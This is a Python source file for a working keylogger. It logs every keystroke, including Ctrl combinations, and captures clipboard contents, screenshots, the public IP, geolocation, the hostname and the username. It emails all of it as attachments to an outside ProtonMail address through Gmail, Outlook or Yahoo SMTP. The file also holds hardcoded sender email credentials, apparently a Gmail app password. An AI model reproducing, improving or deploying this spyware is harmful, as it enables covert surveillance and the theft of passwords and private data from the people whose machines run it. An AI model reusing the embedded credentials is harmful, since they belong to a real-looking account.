# Liabary

from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

import socket
import platform

try:
    import win32clipboard
except ImportError:
    print("win32clipboard not available - clipboard monitoring disabled")
    win32clipboard = None

from pynput.keyboard import Key, Listener

import time
import os
from datetime import datetime
import threading
import atexit

try:
    from scipy.io.wavfile import write
    import sounddevice as sd
except ImportError:
    print("Audio libraries not available - audio monitoring disabled")

try:
    from cryptography.fernet import Fernet
except ImportError:
    print("Cryptography library not available")

import getpass
try:
    from requests import get
except ImportError:
    print("Requests library not available - network features disabled")
    get = None

try:
    from multiprocessing import Process, freeze_support
except ImportError:
    print("Multiprocessing not available")

try:
    from PIL import ImageGrab
except ImportError:
    print("PIL not available - screenshot features disabled")
    ImageGrab = None

# variables
keys_information = "key_log.txt"
system_information = "system_info.txt"
clipboard_information = "clipboard_info.txt"
screenshot_information = "screenshot_info.png"

email_address = "rpoo9309@gmail.com"
email_password = "dgsu sqlb qbyd ppnn"

toaddr = "SamScs@protonmail.com"

file_path = "E:\\Python\\keyloger"
extend ="\\"

# Emergency shutdown flags
_shutdown_flag = threading.Event()
_email_sent = threading.Event()
_cleanup_done = threading.Event()

# Delete old keylog file and create new one on launch
def initialize_keylog():
    keylog_file_path = file_path + extend + keys_information
    
    try:
        # Check if old keylog file exists and delete it
        if os.path.exists(keylog_file_path):
            os.remove(keylog_file_path)
            print(f"Old keylog file deleted: {keylog_file_path}")
        
        # Create new empty keylog file with header
        with open(keylog_file_path, "w") as f:
            current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            f.write(f"=== KEYLOGGER SESSION STARTED AT {current_time} ===\n")
            f.write("=" * 60 + "\n\n")
        
        print(f"New keylog file created: {keylog_file_path}")
        
    except Exception as e:
        print(f"Error initializing keylog file: {e}")

# Function to gather system information
def computer_info():
    try:
        with open(file_path + extend + system_information, "w") as f:
            hostname = socket.gethostname()
            ip_address = socket.gethostbyname(hostname)
            try:
                if get:
                    public_ip = get('https://api.ipify.org').text
                    f.write(f"Public IP: {public_ip}\n")
                else:
                    f.write("Public IP: Requests library not available\n")
            except Exception as e:
                f.write(f"Failed to get public IP: {e}\n")    

            f.write("Processor: " + platform.processor() + "\n")
            f.write("System: " + platform.system() + "\n")
            f.write("Release: " + platform.release() + "\n")
            f.write("Version: " + platform.version() + "\n")
            f.write("Machine: " + platform.machine() + "\n")
            f.write("Platform: " + platform.platform() + "\n")
            f.write("Hostname: " + hostname + "\n")
            f.write("IP Address: " + ip_address + "\n")
            f.write("User: " + getpass.getuser() + "\n")
            try:
                if get:
                    f.write("Geolocation: " + get('https://ipinfo.io/').text + "\n")
                else:
                    f.write("Geolocation: Requests library not available\n")
            except Exception as e:
                f.write(f"Failed to get geolocation: {e}\n")
            
            f.write(f"System info gathered at: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        print(f"System info saved to: {file_path + extend + system_information}")
    except Exception as e:
        print(f"Error gathering computer info: {e}")

# Function to get clipboard content
def get_clipboard_content():
    try:
        # Create or append to clipboard file
        clipboard_file = file_path + extend + clipboard_information
        with open(clipboard_file, "a") as f:
            try:
                if win32clipboard:
                    win32clipboard.OpenClipboard()
                    paste_data = win32clipboard.GetClipboardData()
                    win32clipboard.CloseClipboard()
                    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                    f.write(f"[{timestamp}] Clipboard: {paste_data}\n")
                    print(f"Clipboard content captured at {timestamp}")
                else:
                    f.write(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] Clipboard monitoring: win32clipboard not available\n")
            except Exception as e:
                timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                f.write(f"[{timestamp}] Failed to get clipboard: {e}\n")
    except Exception as e:
        print(f"Error accessing clipboard: {e}")

# Emergency email function for immediate shutdown with multiple attachments
def send_emergency_email(file_name, attachment, toaddr):
    if _email_sent.is_set():
        return True  # Prevent duplicate emails
    
    try:
        print(f"[EMERGENCY] Attempting to send email with all files...")
        
        fromaddr = email_address
        msg = MIMEMultipart()
        msg['From'] = fromaddr
        msg['To'] = toaddr
        msg['Subject'] = "EMERGENCY - Complete System Report"
        body = "EMERGENCY SHUTDOWN - Attached complete system report including keylog, system info, clipboard data, and screenshot."
        msg.attach(MIMEText(body, 'plain'))
        
        # List of all files to attach
        files_to_attach = [
            (file_path + extend + keys_information, "keylog.txt"),
            (file_path + extend + system_information, "system_info.txt"), 
            (file_path + extend + clipboard_information, "clipboard_info.txt"),
            (file_path + extend + screenshot_information, "screenshot.png")
        ]
        
        attached_count = 0
        # Attach each file if it exists
        for file_path_full, filename in files_to_attach:
            try:
                if os.path.exists(file_path_full):
                    with open(file_path_full, "rb") as attachment_file:
                        p = MIMEBase('application', 'octet-stream')
                        p.set_payload(attachment_file.read())
                        encoders.encode_base64(p)
                        p.add_header('Content-Disposition', f"attachment; filename= {filename}")
                        msg.attach(p)
                    print(f"[EMERGENCY] Attached: {filename}")
                    attached_count += 1
                else:
                    print(f"[EMERGENCY] File not found: {filename}")
            except Exception as e:
                print(f"[EMERGENCY] Failed to attach {filename}: {str(e)[:30]}")

        if attached_count == 0:
            print("[EMERGENCY] No files to attach")
            return False

        # Prioritize Gmail with shorter timeout for emergency
        smtp_servers = [('smtp.gmail.com', 587)]
        
        for smtp_server, port in smtp_servers:
            try:
                print(f"[EMERGENCY] Trying {smtp_server}...")
                s = smtplib.SMTP(smtp_server, port)
                s.sock.settimeout(10)  # Slightly longer timeout for multiple attachments
                s.starttls()
                s.login(email_address, email_password)
                text = msg.as_string()
                s.sendmail(fromaddr, toaddr, text)
                s.quit()
                print(f"[EMERGENCY] Complete report sent successfully via {smtp_server}")
                _email_sent.set()  # Mark email as sent
                return True
            except Exception as smtp_error:
                print(f"[EMERGENCY] Failed {smtp_server}: {str(smtp_error)[:50]}")
                try:
                    s.quit()
                except:
                    pass
                continue
        
        print("[EMERGENCY] Email failed")
        return False
        
    except Exception as e:
        print(f"[EMERGENCY] Email error: {str(e)[:50]}")
        return False

# Main function to send email with multiple attachments
def send_email(file_name, attachment, toaddr):
    if _email_sent.is_set():
        return  # Prevent duplicate emails during shutdown
    
    try:
        fromaddr = email_address
        msg = MIMEMultipart()
        msg['From'] = fromaddr
        msg['To'] = toaddr
        msg['Subject'] = "Complete System Monitoring Report"
        body = "Attached complete system monitoring report including keylog, system info, clipboard data, and screenshot."
        msg.attach(MIMEText(body, 'plain'))
        
        # List of all files to attach
        files_to_attach = [
            (file_path + extend + keys_information, "keylog.txt"),
            (file_path + extend + system_information, "system_info.txt"), 
            (file_path + extend + clipboard_information, "clipboard_info.txt"),
            (file_path + extend + screenshot_information, "screenshot.png")
        ]
        
        attached_count = 0
        # Attach each file if it exists
        for file_path_full, filename in files_to_attach:
            try:
                if os.path.exists(file_path_full):
                    with open(file_path_full, "rb") as attachment_file:
                        p = MIMEBase('application', 'octet-stream')
                        p.set_payload(attachment_file.read())
                        encoders.encode_base64(p)
                        p.add_header('Content-Disposition', f"attachment; filename= {filename}")
                        msg.attach(p)
                    print(f"Attached: {filename}")
                    attached_count += 1
                else:
                    print(f"File not found: {filename}")
            except Exception as e:
                print(f"Failed to attach {filename}: {str(e)[:30]}")

        if attached_count == 0:
            print("No files to attach. Skipping email.")
            return

        # Try multiple SMTP servers
        smtp_servers = [
            ('smtp.gmail.com', 587),
            ('smtp.outlook.com', 587),
            ('smtp.mail.yahoo.com', 587)
        ]
        
        email_sent = False
        for smtp_server, port in smtp_servers:
            if _shutdown_flag.is_set():
                break  # Stop if shutdown initiated
            try:
                print(f"Trying to send email via {smtp_server}...")
                s = smtplib.SMTP(smtp_server, port)
                s.starttls()
                s.login(email_address, email_password)
                text = msg.as_string()
                s.sendmail(fromaddr, toaddr, text)
                s.quit()
                print(f"Complete report sent successfully to {toaddr} via {smtp_server}")
                email_sent = True
                break
            except Exception as smtp_error:
                print(f"Failed to send via {smtp_server}: {smtp_error}")
                continue
        
        if not email_sent:
            print("Failed to send email via all SMTP servers")
            # Save email locally as backup
            backup_file = file_path + extend + "email_backup.txt"
            with open(backup_file, "w") as backup:
                backup.write(f"From: {fromaddr}\n")
                backup.write(f"To: {toaddr}\n")
                backup.write(f"Subject: Complete System Monitoring Report\n")
                backup.write(f"Body: {body}\n")
                backup.write(f"Attached Files: {attached_count}\n")
                for file_path_full, filename in files_to_attach:
                    if os.path.exists(file_path_full):
                        backup.write(f"- {filename}: {file_path_full}\n")
                backup.write(f"Timestamp: {datetime.now()}\n")
            print(f"Email details saved to {backup_file}")
        
    except Exception as e:
        print(f"General email error: {e}")
        # Save error log
        error_file = file_path + extend + "email_errors.txt"
        with open(error_file, "a") as error_log:
            error_log.write(f"{datetime.now()}: {str(e)}\n")

# Enhanced backup function for all files
def save_to_network(file_name):
    try:
        # Create a backup folder
        backup_folder = file_path + extend + "backups"
        if not os.path.exists(backup_folder):
            os.makedirs(backup_folder)
        
        # Copy all files with timestamp
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        
        files_to_backup = [
            (file_path + extend + keys_information, f"keylog_backup_{timestamp}.txt"),
            (file_path + extend + system_information, f"system_backup_{timestamp}.txt"), 
            (file_path + extend + clipboard_information, f"clipboard_backup_{timestamp}.txt"),
            (file_path + extend + screenshot_information, f"screenshot_backup_{timestamp}.png")
        ]
        
        import shutil
        for source_file, backup_name in files_to_backup:
            try:
                if os.path.exists(source_file):
                    backup_path = f"{backup_folder}\\{backup_name}"
                    shutil.copy2(source_file, backup_path)
                    print(f"Backed up: {backup_name}")
                else:
                    print(f"Source file not found: {source_file}")
            except Exception as e:
                print(f"Failed to backup {backup_name}: {e}")
        
    except Exception as e:
        print(f"Backup failed: {e}")

# Enhanced screenshot function with error handling
def screenshot():
    try:
        if ImageGrab:
            im = ImageGrab.grab()
            screenshot_path = file_path + extend + screenshot_information
            im.save(screenshot_path, "PNG")
            print(f"Screenshot saved: {screenshot_path}")
        else:
            print("Screenshot feature disabled - PIL not available")
            # Create a placeholder file
            placeholder_path = file_path + extend + "screenshot_unavailable.txt"
            with open(placeholder_path, "w") as f:
                f.write("Screenshot feature not available - PIL library not installed\n")
                f.write(f"Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
    except Exception as e:
        print(f"Screenshot error: {e}")
        # Create error log
        error_path = file_path + extend + "screenshot_error.txt"
        with open(error_path, "w") as f:
            f.write(f"Screenshot failed: {str(e)}\n")
            f.write(f"Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")

# Enhanced emergency shutdown function
def emergency_shutdown():
    """Immediate shutdown on ESC press with guaranteed email of all files"""
    if _cleanup_done.is_set():
        return  # Prevent multiple emergency shutdowns
    _cleanup_done.set()
    
    print("\n[EMERGENCY SHUTDOWN] ESC pressed - Terminating immediately...")
    _shutdown_flag.set()
    
    # Flush any remaining keystrokes immediately
    if keys:
        print("[EMERGENCY] Flushing remaining keystrokes...")
        write_file(keys)
        keys.clear()
    
    # Capture final screenshot
    print("[EMERGENCY] Taking final screenshot...")
    screenshot()
    
    # Capture final clipboard content
    try:
        print("[EMERGENCY] Capturing final clipboard...")
        get_clipboard_content()
    except:
        pass
    
    log_file_path = file_path + extend + keys_information
    if not _email_sent.is_set():
        print("[EMERGENCY] Attempting to send complete report...")
        
        # Try emergency email first (synchronous, blocking)
        email_sent = send_emergency_email(log_file_path, log_file_path, toaddr)
        
        # If emergency email failed, try regular email function as fallback
        if not email_sent:
            print("[EMERGENCY] Primary email failed, trying backup...")
            try:
                send_email(log_file_path, log_file_path, toaddr)
            except:
                pass
        
        # Always create backup regardless
        print("[EMERGENCY] Creating local backup of all files...")
        save_to_network(log_file_path)
    
    # Add emergency notification to log
    try:
        with open(log_file_path, "a") as f:
            ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            f.write(f"\n[{ts}] === EMERGENCY SHUTDOWN TRIGGERED ===\n")
    except:
        pass
    
    print("[EMERGENCY] Shutdown complete in 3 seconds...")
    
    # Force exit after giving time for email to send
    threading.Timer(3.0, lambda: os._exit(0)).start()

# Enhanced cleanup function for normal exit
def cleanup_on_exit():
    """Cleanup function for proper shutdown with email of all files"""
    if _cleanup_done.is_set():
        return  # Prevent multiple cleanups
    _cleanup_done.set()
    
    print("[CLEANUP] Normal shutdown triggered...")
    _shutdown_flag.set()
    if keys:
        write_file(keys)
    
    # Take final screenshot
    screenshot()
    
    # Capture final clipboard
    try:
        get_clipboard_content()
    except:
        pass
    
    # Send email on normal shutdown too (only if not already sent)
    if not _email_sent.is_set():
        print("[CLEANUP] Sending complete shutdown report...")
        send_emergency_email(file_path + extend + keys_information, file_path + extend + keys_information, toaddr)
        save_to_network(file_path + extend + keys_information)

# Register cleanup function
atexit.register(cleanup_on_exit)

count = 0
keys = []

# Track modifier states and prevent duplicates
shift_pressed = False
ctrl_pressed = False
alt_pressed = False

# Track if we already logged the modifier key press
shift_logged = False
ctrl_logged = False
alt_logged = False

def on_press(key):
    global keys, count, shift_pressed, ctrl_pressed, alt_pressed
    global shift_logged, ctrl_logged, alt_logged
    
    # Immediate ESC kill switch
    if key == Key.esc:
        emergency_shutdown()
        return
    
    # Check if shutdown is in progress
    if _shutdown_flag.is_set():
        return
    
    # Handle shift key - log only once per press
    if key == Key.shift or key == Key.shift_r:
        if not shift_pressed:
            shift_pressed = True
            shift_logged = True
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S.%f")[:-3]
            key_with_time = {
                'key': key,
                'timestamp': timestamp,
                'shift_state': shift_pressed
            }
            keys.append(key_with_time)
            count += 1
            print(f"{key} pressed at {timestamp}")
        return
    
    # Handle ctrl key - log only once per press
    if key == Key.ctrl or key == Key.ctrl_l or key == Key.ctrl_r:
        if not ctrl_pressed:
            ctrl_pressed = True
            ctrl_logged = True
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S.%f")[:-3]
            key_with_time = {
                'key': key,
                'timestamp': timestamp,
                'shift_state': shift_pressed
            }
            keys.append(key_with_time)
            count += 1
            print(f"{key} pressed at {timestamp}")
        return
    
    # Handle alt key - log only once per press
    if key == Key.alt or key == Key.alt_l or key == Key.alt_r or key == Key.alt_gr:
        if not alt_pressed:
            alt_pressed = True
            alt_logged = True
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S.%f")[:-3]
            key_with_time = {
                'key': key,
                'timestamp': timestamp,
                'shift_state': shift_pressed
            }
            keys.append(key_with_time)
            count += 1
            print(f"{key} pressed at {timestamp}")
        return
    
    # Check for Ctrl combinations first (both regular and ASCII)
    if ctrl_pressed:
        # Check for regular character combinations
        if hasattr(key, 'char') and key.char and key.char in ['c', 'v', 'x', 'a']:
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S.%f")[:-3]
            key_with_time = {
                'key': f"ctrl+{key.char}",
                'timestamp': timestamp,
                'shift_state': shift_pressed
            }
            keys.append(key_with_time)
            count += 1
            print(f"Ctrl+{key.char.upper()} pressed at {timestamp}")
            
            if count >= 10:
                count = 0
                write_file(keys)
                keys = []
            return
        
        # Check for ASCII control characters (backup detection)
        elif hasattr(key, 'char') and key.char:
            char_code = ord(key.char)
            if char_code == 1:  # Ctrl+A
                timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S.%f")[:-3]
                key_with_time = {
                    'key': 'ctrl+a',
                    'timestamp': timestamp,
                    'shift_state': shift_pressed
                }
                keys.append(key_with_time)
                count += 1
                print(f"Ctrl+A pressed at {timestamp}")
                
                if count >= 10:
                    count = 0
                    write_file(keys)
                    keys = []
                return
            elif char_code == 3:  # Ctrl+C
                timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S.%f")[:-3]
                key_with_time = {
                    'key': 'ctrl+c',
                    'timestamp': timestamp,
                    'shift_state': shift_pressed
                }
                keys.append(key_with_time)
                count += 1
                print(f"Ctrl+C pressed at {timestamp}")
                
                if count >= 10:
                    count = 0
                    write_file(keys)
                    keys = []
                return
            elif char_code == 22:  # Ctrl+V
                timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S.%f")[:-3]
                key_with_time = {
                    'key': 'ctrl+v',
                    'timestamp': timestamp,
                    'shift_state': shift_pressed
                }
                keys.append(key_with_time)
                count += 1
                print(f"Ctrl+V pressed at {timestamp}")
                
                if count >= 10:
                    count = 0
                    write_file(keys)
                    keys = []
                return
            elif char_code == 24:  # Ctrl+X
                timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S.%f")[:-3]
                key_with_time = {
                    'key': 'ctrl+x',
                    'timestamp': timestamp,
                    'shift_state': shift_pressed
                }
                keys.append(key_with_time)
                count += 1
                print(f"Ctrl+X pressed at {timestamp}")
                
                if count >= 10:
                    count = 0
                    write_file(keys)
                    keys = []
                return
    
    # Record all other keys with timestamp
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S.%f")[:-3]
    key_with_time = {
        'key': key,
        'timestamp': timestamp,
        'shift_state': shift_pressed
    }
    
    keys.append(key_with_time)
    count += 1
    print(f"{key} pressed at {timestamp}")

    if count >= 10:
        count = 0
        write_file(keys)
        keys = []

def write_file(keys):
    try:
        with open(file_path + extend + keys_information, "a") as f:
            for key_data in keys:
                key = key_data['key']
                timestamp = key_data['timestamp']
                k = str(key).replace("'", "")
                
                # Write timestamp without colors for better readability
                f.write(f"[{timestamp}] ")
                
                # Handle Ctrl combinations first
                if "ctrl+c" in k:
                    f.write("[CTRL+C]")
                elif "ctrl+v" in k:
                    f.write("[CTRL+V]")
                elif "ctrl+x" in k:
                    f.write("[CTRL+X]")
                elif "ctrl+a" in k:
                    f.write("[CTRL+A]")

                # Handle ASCII control characters for Ctrl combinations
                elif k == "\\x01":  # Ctrl+A
                    f.write("[CTRL+A]")
                elif k == "\\x03":  # Ctrl+C
                    f.write("[CTRL+C]")
                elif k == "\\x16":  # Ctrl+V
                    f.write("[CTRL+V]")
                elif k == "\\x18":  # Ctrl+X
                    f.write("[CTRL+X]")
                    
                # Handle other special keys
                elif "space" in k:
                    f.write("[SPACEBAR]")  
                elif "enter" in k:
                    f.write("[ENTER]") 
                elif "tab" in k:
                    f.write("[TAB]")
                elif "backspace" in k:
                    f.write("[BACKSPACE]")
                elif "shift" in k:
                    f.write("[SHIFT]")
                elif "ctrl" in k:
                    f.write("[CTRL]")
                elif "alt" in k:
                    f.write("[ALT]")
                elif "caps_lock" in k:
                    f.write("[CAPS LOCK]")
                elif "Key." not in k:  # Regular characters
                    f.write(k)
                
                f.write("\n")
    except Exception as e:
        print(f"Error writing to file: {e}")

def on_release(key):
    global shift_pressed, ctrl_pressed, alt_pressed
    global shift_logged, ctrl_logged, alt_logged
    
    # Immediate ESC kill switch
    if key == Key.esc:
        emergency_shutdown()
        return False
    
    # Check if shutdown is in progress
    if _shutdown_flag.is_set():
        return False
    
    # Release shift state and reset logged flag
    if key == Key.shift or key == Key.shift_r:
        shift_pressed = False
        shift_logged = False
    
    # Release ctrl state and reset logged flag
    if key == Key.ctrl or key == Key.ctrl_l or key == Key.ctrl_r:
        ctrl_pressed = False
        ctrl_logged = False
    
    # Release alt state and reset logged flag
    if key == Key.alt or key == Key.alt_l or key == Key.alt_r or key == Key.alt_gr:
        alt_pressed = False
        alt_logged = False

# Initialize keylog file (delete old, create new) - CALL THIS FIRST
initialize_keylog()

# Take initial screenshot
screenshot()

# Initialize system info and clipboard if possible
try:
    print("Gathering system information...")
    computer_info()
except Exception as e:
    print(f"Error gathering system info: {e}")

try:
    print("Capturing initial clipboard content...")
    get_clipboard_content()
except Exception as e:
    print(f"Error getting clipboard: {e}")

print("Keylogger started with complete monitoring. Press ESC for immediate emergency shutdown.")
print("All files (keylog, system info, clipboard, screenshot) will be emailed together.")
print(f"Logging to: {file_path + extend + keys_information}")

try:
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
except KeyboardInterrupt:
    if not _cleanup_done.is_set():
        emergency_shutdown()
except Exception as e:
    print(f"Listener error: {e}")
    if not _cleanup_done.is_set():
        emergency_shutdown()


